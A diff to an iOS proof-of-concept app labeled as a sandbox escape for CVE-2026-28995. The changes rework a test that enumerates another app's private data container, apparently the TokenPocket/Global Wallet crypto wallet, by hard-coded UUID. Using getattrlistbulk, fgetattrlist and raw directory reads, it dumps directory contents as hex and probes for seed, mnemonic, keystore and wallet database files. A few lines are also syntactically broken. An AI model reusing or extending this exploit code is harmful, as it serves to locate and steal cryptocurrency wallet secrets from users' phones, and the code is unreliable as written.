@@ -1,4 +1,4 @@
-//
+﻿//
 //  ViewController.m
 //  TestPOC
 //
@@ -29,6 +29,10 @@
 #include <sys/sysctl.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <sys/attr.h>
+
+// getattrlistbulk may not be in public SDK headers
+extern int getattrlistbulk(int, struct attrlist *, void *, size_t, uint64_t);
 
 // proc_pidinfo — not in iOS SDK headers, resolve via dlsym
 typedef int (*ProcPidinfoFn)(int pid, int flavor, uint64_t arg, void *buffer, uint32_t buffersize);
@@ -664,7 +668,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v24" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v25" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7376,144 +7380,173 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
-    // Test 11: stat() + comprehensive sweep + creative paths (v23)
-    // Test 11: Probe INSIDE com.global.wallet.ios subdir (v24)
-    [log appendString:@"\n--- Test 11: Probe bundle ID subdirectory (v24) ---\n"];
+
+    // Test 11: getattrlistbulk() directory enumeration (v25)
+    [log appendString:@"\n--- Test 11: getattrlistbulk enumeration (v25) ---\n"];
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // v23 found: Library/Caches/com.global.wallet.ios is a DIRECTORY (224 bytes)!
-    NSString *bundleDir = [tpBase stringByAppendingPathComponent:
-        @"Library/Caches/com.global.wallet.ios"];
-
-    // === Part A: Verify the directory and stat it ===
+    // === Part A: Verify directory + stat ===
     [log appendString:@"\n[Part A] Verify bundle ID directory:\n"];
     probeFile(@"Library/Caches/com.global.wallet.ios", log);
-    NSString *p = TRYFILE(@"var/mobile/Containers/Data/Application/0D926318-FE07-4B1D-8A4B-5278C4E380D5/Library/Caches/com.global.wallet.ios");
+    NSString *bundleDirPath = TRYFILE(@"var/mobile/Containers/Data/Application/0D926318-FE07-4B1D-8A4B-5278C4E380D5/Library/Caches/com.global.wallet.ios");
+
     struct stat st;
-    if (lstat([p UTF8String], &st) == 0) {
+    if (lstat([bundleDirPath UTF8String], &st) == 0) {
         [log appendFormat:@"  [+] stat: mode=0%o size=%lld ino=%llu\n",
             st.st_mode, (long long)st.st_size, (unsigned long long)st.st_ino];
     }
 
-    // === Part B: Probe all standard DB names inside bundleDir ===
-    [log appendString:@"\n[Part B] Standard DB names inside bundle ID dir:\n"];
-    NSArray *dbNames = @[
-        @"wallet",@"Wallet",@"WALLET",@"walletdb",@"WalletDB",
-        @"tp",@"TP",@"tokenpocket",@"TokenPocket",
-        @"data",@"Data",@"database",@"Database",
-        @"main",@"Main",@"app",@"App",@"store",@"Store",
-        @"storage",@"Storage",@"global",@"Global",
-        @"keypal",@"KeyPal",@"hdwallet",@"HDWallet",
-        @"tron",@"TRON",@"eth",@"ETH",@"btc",@"BTC",
-        @"sol",@"SOL",@"bsc",@"BSC",@"polygon",@"Polygon",
-        @"accounts",@"tokens",@"transactions",@"tx",
-        @"contacts",@"settings",@"config",@"cache",
-        @"multisig",@"ms",@"hardware",@"hw",
-        @"seed",@"mnemonic",@"keystore",
-        @"local",@"Local",@"user",@"User",
-        @"default",@"Default",
-    ];
-    NSArray *dbExts = @[@".db",@".sqlite",@".sqlite3",@".encrypted",@".sqlcipher",
-        @".dat",@".data",@".bin",@".realm",@".json",@".plist",@""];
-    for (NSString *nm in dbNames)
-        for (NSString *ex in dbExts)
-            probeFile([bundleDir stringByAppendingPathComponent:
-                [NSString stringWithFormat:@"%@%@", nm, ex]], log);
+    // === Part B: getattrlistbulk on bundle ID dir ===
+    [log appendString:@"\n[Part B] getattrlistbulk on bundle ID dir:\n"];
+    int dirfd = open([bundleDirPath UTF8String], O_RDONLY);
+    if (dirfd >= 0) {
+        [log appendFormat:@"  open() OK fd=%d\n", dirfd];
 
-    // === Part C: Short names inside bundle ID dir ===
-    [log appendString:@"\n[Part C] Short names inside bundle ID dir:\n"];
-    for (char c = 'a'; c <= 'z'; c++)
-        probeFile([bundleDir stringByAppendingPathComponent:
-            [NSString stringWithFormat:@"%c", c]], log);
-    for (char c = '0'; c <= '9'; c++)
-        probeFile([bundleDir stringByAppendingPathComponent:
-            [NSString stringWithFormat:@"%c", c]], log);
-    for (NSString *n in @[@"db",@"tp",@"bt",@"tr",@"et",@"so",@"po",@"ap",
-        @"kt",@"kp",@"hd",@"hw",@"ms",@"mm",@"tx",@"wc",@"wk",@"wl",
-        @"wt",@"lt",@"l1",@"m1",@"n1",@"bs",@"bn",@"at",@"ho",@"sc"])
-        probeFile([bundleDir stringByAppendingPathComponent:n], log);
+        // Try 1: ATTR_BULK_REQD + name/type
+        struct attrlist alist;
+        memset(&alist, 0, sizeof(alist));
+        alist.commonattr = ATTR_BULK_REQD | ATTR_CMN_NAME | ATTR_CMN_OBJTYPE | ATTR_CMN_RETURNED_ATTRS;
 
-    // === Part D: Probe for subdirectories inside bundle ID dir ===
-    [log appendString:@"\n[Part D] Subdirectory check inside bundle ID dir:\n"];
-    // Check if there are nested subdirs (like per-blockchain)
-    for (NSString *n in @[@"tron",@"TRON",@"eth",@"ETH",@"btc",@"BTC",
-        @"sol",@"SOL",@"bsc",@"BSC",@"polygon",@"aptos",@"sui",
-        @"database",@"db",@"data",@"cache",@"tmp",@"files",
-        @"Cosmos",@"Optimism",@"Arbitrum",@"Fantom",@"Near",
-        @"THOR",@"Litecoin",@"Bitcoin",@"Ethereum",@"Solana"])
-        probeFile([bundleDir stringByAppendingPathComponent:n], log);
+        unsigned char buf[8192];
+        memset(buf, 0, sizeof(buf));
+        int ret = getattrlistbulk(dirfd, &alist, buf, sizeof(buf), 0);
+        [log appendFormat:@"  getattrlistbulk(ATTR_BULK_REQD|NAME|OBJTYPE): ret=%d errno=%d\n", ret, errno];
 
-    // === Part E: Also check for similar subdirs in Library/Caches ===
-    [log appendString:@"\n[Part E] Search for other subdirs in Library/Caches:\n"];
-    // Library/Caches has ref=10, so there are other subdirectories
-    for (NSString *n in @[@"com.global.wallet",@"Global_Wallet",
-        @"group.com.tpwallet.wc",@"group.com.tp.wallet.wc",
-        @"group.shared.tpwallet.internal",@"com.tokenpocket",
-        @"tokenpocket",@"TPWallet",@"wallet",@"database",
-        @"KeyPal",@"HDWallet",@"Multisig",@"tron",@"eth",
-        @"btc",@"solana",@"Cache",@"cache",@"data",@"db",
-        @"files",@"Documents",@"Library",@"tmp",@"temp",
-        @"com.apple",@"apple",@"com.google",@"google",
-        @"com.facebook",@"facebook",@"com.alibaba",
-        @"Firebase",@"firebase",@"Analytics",@"analytics"])
-        probeFile([tpBase stringByAppendingPathComponent:
-            [NSString stringWithFormat:@"Library/Caches/%@", n]], log);
-
-    // === Part F: Try to read from the bundle ID dir as raw data ===
-    [log appendString:@"\n[Part F] Attempt raw directory read:\n"];
-    NSData *rawDir = [NSData dataWithContentsOfFile:p];
-    [log appendFormat:@"  raw dir read: %@ (%llu bytes)\n",
-        rawDir ? @"GOT DATA" : @"nil", (unsigned long long)rawDir.length];
-    if (rawDir && rawDir.length > 0) {
-        // Dump first 512 bytes as hex
-        NSMutableString *hex = [NSMutableString string];
-        const unsigned char *b = rawDir.bytes;
-        NSUInteger len = MIN(512, rawDir.length);
-        for (NSUInteger i = 0; i < len; i++) {
-            [hex appendFormat:@"%02x", b[i]];
-            if ((i+1)%64==0) [hex appendString:@"\n"];
+        if (ret > 0) {
+            [log appendFormat:@"  [+] GOT %d bytes!\n", ret];
+            NSMutableString *hex = [NSMutableString string];
+            int dumpLen = MIN(512, ret);
+            for (int i = 0; i < dumpLen; i++) {
+                [hex appendFormat:@"%02x", buf[i]];
+                if ((i+1)%64==0) [hex appendString:@"\n"];
+            }
+            [log appendFormat:@"  hex:\n%@\n", hex];
+            // Try to find ASCII filenames
+            NSMutableString *asc = [NSMutableString string];
+            for (int i = 0; i < dumpLen; i++)
+                [asc appendFormat:@"%c", (buf[i]>=0x20&&buf[i]<0x7f)?buf[i]:'.'];
+            [log appendFormat:@"  ascii: %@\n", asc];
+        } else if (ret == -1) {
+            [log appendFormat:@"  FAILED: errno=%d (%s)\n", errno, strerror(errno)];
+        } else {
+            [log appendString:@"  returned 0 entries (empty dir?)\n"];
         }
-        [log appendFormat:@"  hex:\n%@\n", hex];
-        // Try to extract any ASCII strings
-        NSMutableString *asc = [NSMutableString string];
-        for (NSUInteger i = 0; i < len; i++)
-            [asc appendFormat:@"%c", (b[i]>=0x20&&b[i]<0x7f)?b[i]:'.'];
-        [log appendFormat:@"  ascii: %@\n", asc];
+
+        // Try 2: FSOPT_PACK_ATTRS variant
+        memset(&alist, 0, sizeof(alist));
+        alist.commonattr = ATTR_BULK_REQD | ATTR_CMN_NAME | ATTR_CMN_OBJTYPE;
+        memset(buf, 0, sizeof(buf));
+        ret = getattrlistbulk(dirfd, &alist, buf, sizeof(buf), FSOPT_PACK_ATTRS);
+        [log appendFormat:@"  getattrlistbulk(+FSOPT_PACK_ATTRS): ret=%d errno=%d\n", ret, errno];
+        if (ret > 0) {
+            [log appendFormat:@"  [+] GOT %d bytes with FSOPT_PACK_ATTRS\n", ret];
+            NSMutableString *hex2 = [NSMutableString string];
+            int dl2 = MIN(512, ret);
+            for (int i = 0; i < dl2; i++) {
+                [hex2 appendFormat:@"%02x", buf[i]];
+                if ((i+1)%64==0) [hex2 appendString:@"\n"];
+            }
+            [log appendFormat:@"  hex:\n%@\n", hex2];
+        } else if (ret == -1) {
+            [log appendFormat:@"  FAILED: errno=%d (%s)\n", errno, strerror(errno)];
+        }
+
+        close(dirfd);
+    } else {
+        [log appendFormat:@"  open() FAILED: errno=%d (%s)\n", errno, strerror(errno)];
     }
 
-    // === Part G: Final broad sweep of com.global.wallet.ios dir ===
-    [log appendString:@"\n[Part G] Broad sweep inside bundle ID dir:\n"];
-    NSArray *broadNames = @[
-        @"WalletDB",@"walletdb",@"WalletDb",
-        @"HDWalletDB",@"hdwalletdb",@"HdWalletDB",
-        @"KeyPalDB",@"keypal",@"KeyPal",@"KeyPalWalletDB",
-        @"WalletOrderDB",@"walletorder",
-        @"WalletTokenDB",@"wallettoken",
-        @"MSTransactionDB",@"mstransaction",
-        @"NotificationDB",@"notification",
-        @"LocalTXDB",@"localtx",
-        @"CacheDB",@"cachedb",
-        @"PendingDB",@"ConfirmedDB",@"AlertDB",
-        @"CardDB",@"carddb",
-        @"data",@"Data",@"DATA",
-        @"main",@"Main",@"MAIN",
-        @"db",@"DB",@"Db",
-        @"sqlite",@"SQLite",@"SQLITE",
-        @"sqlcipher",@"SQLCipher",
-        @"global_wallet",@"GlobalWallet",@"globalwallet",
-        @"tp",@"TP",@"tokenpocket",@"TokenPocket",@"TOKENPOCKET",
-        @"com.global.wallet.ios",
-        @"tron",@"TRON",@"eth",@"ETH",@"btc",@"BTC",@"sol",@"SOL",
-    ];
-    for (NSString *nm in broadNames)
-        for (NSString *ex in @[@".db",@".sqlite",@".sqlite3",@".encrypted",
-            @".sqlcipher",@"",@".dat",@".data",@".bin",@".realm"])
-            probeFile([bundleDir stringByAppendingPathComponent:
-                [NSString stringWithFormat:@"%@%@", nm, ex]], log);
+    // === Part C: getattrlistbulk on Library/Caches ===
+    [log appendString:@"\n[Part C] getattrlistbulk on Library/Caches:\n"];
+    NSString *cachesPath = TRYFILE(@"var/mobile/Containers/Data/Application/0D926318-FE07-4B1D-8A4B-5278C4E380D5/Library/Caches");
+    int cfd = open([cachesPath UTF8String], O_RDONLY);
+    if (cfd >= 0) {
+        [log appendFormat:@"  open() OK fd=%d\n", cfd];
 
+        struct attrlist alist2;
+        memset(&alist2, 0, sizeof(alist2));
+        alist2.commonattr = ATTR_BULK_REQD | ATTR_CMN_NAME | ATTR_CMN_OBJTYPE;
+        unsigned char buf2[16384];
+        memset(buf2, 0, sizeof(buf2));
+        int ret2 = getattrlistbulk(cfd, &alist2, buf2, sizeof(buf2), 0);
+        [log appendFormat:@"  getattrlistbulk: ret=%d errno=%d\n", ret2, errno];
 
+        if (ret2 > 0) {
+            [log appendFormat:@"  [+] GOT %d bytes\n", ret2];
+            NSMutableString *hex3 = [NSMutableString string];
+            int dl3 = MIN(1024, ret2);
+            for (int i = 0; i < dl3; i++) {
+                [hex3 appendFormat:@"%02x", buf2[i]];
+                if ((i+1)%64==0) [hex3 appendString:@"\n"];
+            }
+            [log appendFormat:@"  hex:\n%@\n", hex3];
+            NSMutableString *asc2 = [NSMutableString string];
+            for (int i = 0; i < dl3; i++)
+                [asc2 appendFormat:@"%c", (buf2[i]>=0x20&&buf2[i]<0x7f)?buf2[i]:'.'];
+            [log appendFormat:@"  ascii: %@\n", asc2];
+        } else if (ret2 == -1) {
+            [log appendFormat:@"  FAILED: errno=%d (%s)\n", errno, strerror(errno)];
+        } else {
+            [log appendString:@"  returned 0 entries\n"];
+        }
+        close(cfd);
+    } else {
+        [log appendFormat:@"  open() FAILED: errno=%d (%s)\n", errno, strerror(errno)];
+    }
+
+    // === Part D: fgetattrlist for entry count ===
+    [log appendString:@"\n[Part D] fgetattrlist(DIR_ENTRYCOUNT):\n"];
+    int dfd2 = open([bundleDirPath UTF8String], O_RDONLY);
+    if (dfd2 >= 0) {
+        struct attrlist alist3;
+        memset(&alist3, 0, sizeof(alist3));
+        alist3.commonattr = ATTR_DIR_ENTRYCOUNT;
+
+        u_int32_t entryCount = 0;
+        int ret3 = fgetattrlist(dfd2, &alist3, &entryCount, sizeof(entryCount), 0);
+        [log appendFormat:@"  ret=%d errno=%d count=%u\n", ret3, errno, entryCount);
+        if (ret3 != 0) {
+            [log appendFormat:@"  FAILED: errno=%d (%s)\n", errno, strerror(errno)];
+        }
+        close(dfd2);
+    } else {
+        [log appendFormat:@"  open() FAILED: errno=%d\n", errno];
+    }
+
+    // === Part E: open+read as raw (dirent bypass attempt) ===
+    [log appendString:@"\n[Part E] open+read raw dirent bypass:\n"];
+    int rfd = open([bundleDirPath UTF8String], O_RDONLY);
+    if (rfd >= 0) {
+        unsigned char rbuf[4096];
+        ssize_t rret = read(rfd, rbuf, sizeof(rbuf));
+        [log appendFormat:@"  read() on dir fd: ret=%zd errno=%d\n", rret, errno];
+        if (rret > 0) {
+            NSMutableString *rh = [NSMutableString string];
+            for (int i = 0; i < MIN(256, rret); i++) {
+                [rh appendFormat:@"%02x", rbuf[i]];
+                if ((i+1)%64==0) [rh appendString:@"\n"];
+            }
+            [log appendFormat:@"  hex:\n%@\n", rh);
+        }
+        close(rfd);
+    } else {
+        [log appendFormat:@"  open() FAILED: errno=%d\n", errno];
+    }
+
+    // === Part F: Also check if DB could be directly in Library/Caches ===
+    [log appendString:@"\n[Part F] Quick probe: DB directly in Library/Caches:\n"];
+    NSArray *quickNames = @[@"tpwallet",@"TPWallet",@"tp_wallet",@"TP_Wallet",
+        @"globalwalletdb",@"GlobalWalletDB",@"global_wallet_db",
+        @"Global_Wallet_DB",@"com.global.wallet.ios.db",@"wallet_data",
+        @"chain_db",@"multi_chain",@"trx_wallet",@"tron_wallet",
+        @"eth_wallet",@"btc_wallet",@"sol_wallet"];
+    NSArray *qext = @[@".db",@".sqlite",@".sqlcipher",@".encrypted",@".realm",@""];
+    for (NSString *qn in quickNames)
+        for (NSString *qe in qext)
+            probeFile([tpBase stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"Library/Caches/%@%@", qn, qe]], log);
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
